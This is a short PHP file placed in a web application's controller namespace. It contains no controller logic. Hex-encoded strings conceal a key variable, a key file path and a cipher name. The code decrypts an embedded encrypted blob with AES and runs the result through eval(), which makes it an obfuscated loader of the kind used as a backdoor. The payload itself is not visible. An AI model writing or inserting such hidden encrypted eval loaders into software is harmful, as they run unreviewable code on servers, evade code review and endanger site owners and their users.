<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('spGf1V9O+xFMCMfwubA3cw==');

$c=base64_decode(

'0jVn8OikhCIdQdCfxAQVDetndigB4W46qvrmNy2/X6Y/19T0smZATp5RD2E/Rvv0xbYiBWZt9cot' .
'oEWYUDHxWYDfkJfv8tO/5LSK22zXxZFN0Bd9QK8gksLyavh9Goj0wItI1GdBaI2iF06Gg+wLcdVn' .
'se9k1FvLPF/OOqApPknlXF/mWHuEkn26VWeBeqdowtaXH8g0z4G7gqlkgSdKbjBbaoFj2fkLgSuf' .
'Z+QzHNjjSHWdqRCnhNlP7Z/bt6lu'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

